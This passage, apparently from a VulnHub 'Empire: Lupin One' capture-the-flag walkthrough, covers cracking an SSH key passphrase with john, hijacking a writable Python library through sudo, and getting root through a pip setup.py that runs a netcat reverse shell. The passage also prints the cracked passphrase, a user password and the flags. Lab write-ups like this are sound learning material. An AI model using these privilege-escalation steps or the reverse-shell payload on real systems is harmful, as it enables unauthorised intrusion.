3f26337f518ad446b4885e8e9b16ac391b4b35473214c4cf8b48c0780a934d414c3df8af279e97fe0e465b0289427ae9699150df44a15964782cd02708af2$16$614
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\Empire\1> ssh2john id_rsa > rsa_hash
```
\
Then used john to crack the hash
```bash
john -w:/usr/share/wordlists/fasttrack.txt rsa_hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (id_rsa)     
1g 0:00:00:04 DONE (2026-02-10 04:47) 0.2267g/s 21.76p/s 21.76c/s 21.76C/s Autumn2013..testing123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
\
Now, afer ssh if we give this password , we get a shell
```bash
 ssh icex64@192.168.0.110 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
########################################
Welcome to Empire: Lupin One
########################################
Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
icex64@LupinOne:~$ id
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
icex64@LupinOne:~$ cat user.txt 
    ...,    ,...    ..,.   .,,  *&@@@@@@@@@@&/.    ,,,.   .,..    ...,    ...,  
    ,,,.    .,,,    *&@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&@,.   ..,,    ,,,,    ,,,.  
..,.    ,..,  (@&#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%,.    ..,,    ,...    ..
    .... .@&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  
    .,#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  
.,,,&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@#@.,    .,.,    .,..    .,
...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@####@*.    ..,,    ....    ,.
   @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%#######@% .,.,    .,.,    .,.,  
..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%#######@@,    ..,.    ,..,    ..
.,,, @@@@@@@@&%%%%%%%%%%%%%&@@@@@@@@@@@@@@@@@@@%%%#####@@,    .,,,    ,,.,    .,
    ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%###@@ .,..    ...,    ....  
...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#&@.    ...,    ...,    ..
....   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..
    .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%#@*.,.,    .,.,    ..@@@@
..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#@@    ..,.    ,..*@&&@@.
.,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&&&@( ,,
    ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%@@%%&@@@, ,,,@&@@@.,,,  
....    ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&%%%%&%,@%%%%%%%#@@@@@%..    ..
...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@,*,,@%%%%%%@@@&@%%@..    ..
    ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&@@@%%###@ ,,.,  
    .,. @@&&&@@,,/@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,,,,*,,@%%%@&&@@%%%%%##&* ,...  
.,,, @@&@@&@&@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&@%%&@@@&@%%%%%%%%@/.,    .,
  /@@&&&&&&&&&&@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&%%%%@&&&@%%%%%%%%%@(    ,..,  
 @&@&@&@&@&@&@&&@@@@@(,*,*,,**,*,*,,,*#&@@&%%%%%%%%&@@@@@%%%%%%%%@&..,    .,.,  
@@@&&&&&&&&&&&&&&&&&@@@&&&@@@@&&@@&&@&&&%&%%%%%%%@&&&@&%%%%%%&@,..    ...,    ..
 @&&&@&@&@&@&@&@&@&@&@&@&@&@&&@@@&&&&&&&%&%%%%&@&&@@%%%#&@%..,    .,.,    .,.,  
  @@@@&&&&&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&%%&%@&@&@&@@%..   ....    ....    ,..,  
.,,, *@@&&&@&@&@&@&@&@&&&&&&&&&&&&&&&&&%&&@@&&@....    ,.,    .,,,    ,,..    .,
    ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&&@(,,    ,,,.   .,,,    ,,.,    .,,.  
    .,.,    .,,,    .,,.   ..,.    ,*@@&&@ ,,,,    ,.,.   .,.,    .,.,    .,.,  
...,    ....    ....    ,..    ,..@@@&@#,..    ....    ,..    ...,    ....    ..
    ....    ....    ...    ....@.,%&@..    ....    ...    ....    ....    ....  
    ...,    ....    ....   .*/,...&.,,,    ....    ....   .,..    ...,    ...,  
.,.,    .,.,    ,,.,    .,../*,,&,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,

3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```
\
Next , checking sudo permissions to get root access
```bash
icex64@LupinOne:~$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py

```
\
When we check arsene home dir
```bash
icex64@LupinOne:~$ cd /home/arsene/
icex64@LupinOne:/home/arsene$ ls -la
total 40
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .
drwxr-xr-x 4 root   root   4096 Oct  4  2021 ..
-rw------- 1 arsene arsene   47 Oct  4  2021 .bash_history
-rw-r--r-- 1 arsene arsene  220 Oct  4  2021 .bash_logout
-rw-r--r-- 1 arsene arsene 3526 Oct  4  2021 .bashrc
-rw-r--r-- 1 arsene arsene  118 Oct  4  2021 heist.py
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .local
-rw-r--r-- 1 arsene arsene  339 Oct  4  2021 note.txt
-rw-r--r-- 1 arsene arsene  807 Oct  4  2021 .profile
-rw------- 1 arsene arsene   67 Oct  4  2021 .secret
icex64@LupinOne:/home/arsene$ cat heist.py 
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
icex64@LupinOne:/home/arsene$ cat note.txt 
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.
```
\
So , we see that we need to use the "webbrowser" which is being imported as our attack surface
\
Usually, we can either create a duplicate webbrowser.py with a reverse shell or check if we can add our payload in the actual file
\
Then i used this command to find the actual file
```bash
find / -type f -name "webbrowser.py" 2>/dev/null
/usr/lib/python3.9/webbrowser.py
```
\
and when we check its permissions , we see that it is writeable
```bash
-rwxrwxrwx  1 root root  24087 Oct  4  2021 webbrowser.py
```
\
So i just add my payload
\
<img width="736" height="404" alt="image" src="https://github.com/user-attachments/assets/a2eabe7e-24fd-4c0d-b598-d124b18391fa" />
\
After this , if we run this command
```bash
icex64@LupinOne:/usr/lib/python3.9$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
\
We get a shell as arsene
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from LupinOne~192.168.0.110-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/LupinOne~192.168.0.110-Linux-x86_64/2026_02_10-05_00_27-483.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
arsene@LupinOne:/usr/lib/python3.9$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
arsene@LupinOne:/usr/lib/python3.9$ 
```
\
when we check home directory files
```bash
arsene@LupinOne:/usr/lib/python3.9$ cd ~
arsene@LupinOne:~$ ls -la
total 40
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .
drwxr-xr-x 4 root   root   4096 Oct  4  2021 ..
-rw------- 1 arsene arsene   47 Oct  4  2021 .bash_history
-rw-r--r-- 1 arsene arsene  220 Oct  4  2021 .bash_logout
-rw-r--r-- 1 arsene arsene 3526 Oct  4  2021 .bashrc
-rw-r--r-- 1 arsene arsene  118 Oct  4  2021 heist.py
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .local
-rw-r--r-- 1 arsene arsene  339 Oct  4  2021 note.txt
-rw-r--r-- 1 arsene arsene  807 Oct  4  2021 .profile
-rw------- 1 arsene arsene   67 Oct  4  2021 .secret
arsene@LupinOne:~$ cat .secret 
I dont like to forget my password "rQ8EE"UK,eV)weg~*nd-`5:{*"j7*Q"
```
\
WE have arsene's password and if we check sudo permissions
```bash
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip

```
\
WE have unrestricted access on pip, so following this  "https://gtfobins.org/gtfobins/pip/#inherit" 
\
I create a python file with our payload and then try to install it using pip
\
So first , we have to create a directory
```bash
arsene@LupinOne:/tmp$ mkdir tmp-dir
```
\
and then we have to create a "setup.py"  file with our payload content
```bash
arsene@LupinOne:/tmp/tmp-dir$ cat setup.py 
import os
os.system("busybox nc 192.168.0.111 4446 -e /bin/sh")
```
\
and then we come back to /tmp dir and run
```bash
arsene@LupinOne:/tmp$ sudo pip install tmp-dir/
```
\
then on the listener
```bash
penelope -p 4446
[+] Listening for reverse shells on 0.0.0.0:4446 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from LupinOne~192.168.0.110-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/LupinOne~192.168.0.110-Linux-x86_64/2026_02_10-05_13_04-675.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@LupinOne:/tmp/pip-req-build-kgplyblr# id
uid=0(root) gid=0(root) groups=0(root)
root@LupinOne:/tmp/pip-req-build-kgplyblr# cd /root
root@LupinOne:~# ls -la
total 40
drwx------  5 root root 4096 Feb 10 05:07 .
drwxr-xr-x 18 root root 4096 Oct  4  2021 ..
-rw-------  1 root root  234 Oct  7  2021 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Feb 10 05:07 .cache
drwxr-xr-x  3 root root 4096 Oct  4  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   12 Oct  4  2021 .python_history
-rw-r--r--  1 root root 3325 Oct  4  2021 root.txt
drwx------  2 root root 4096 Oct  4  2021 .ssh
root@LupinOne:~# cat root.txt 
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&&&&&&&&&(            /&&&&&&&&&                       
,                    &&&&&&*                          @&&&&&&                   
,                *&&&&&                                   &&&&&&                
,              &&&&&                                         &&&&&.             
,            &&&&                   ./#%@@&#,                   &&&&*           
,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&          
,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&        
,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&       
,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&     
,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&    
,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&   
,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/  
,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &  
, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@ 
,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & & 
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
*& &                    &&&&&        /   /&&&&         &&&                   & @
*/(,                      &&                            &                   / &.
* & &                     &&&       #             &&&&&&      @             & &.
* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @, 
/  & %                   .&&&&  &@ @                 &/                    @ &  
*   & @                  &&&&&&    &&.               ,                    & &   
*    & &               &&&&&&&&&& &    &&&(          &                   & &    
,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &     
,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &      
,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &       
,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*        
,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@          
,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&            
,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&               
,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&                  
/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,                     
,                           &&&&&/...         .#&&&&#                           

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.
```
\
The End , Thank You for reading till here
